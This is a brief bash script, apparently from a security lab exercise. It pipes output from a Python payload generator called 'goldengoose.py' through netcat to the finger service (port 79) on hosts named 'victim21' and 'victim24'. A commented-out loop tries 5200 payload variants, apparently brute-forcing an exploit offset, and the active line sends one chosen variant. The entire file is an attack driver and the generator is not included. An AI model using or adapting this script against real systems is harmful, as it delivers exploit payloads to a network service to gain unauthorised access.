#!/bin/bash
#END=5200
#for ((i=1;i<=END;i++));
#do
#   python3 goldengoose.py $i | nc victim21 79
#done

python3 goldengoose.py 4178 | nc victim24 79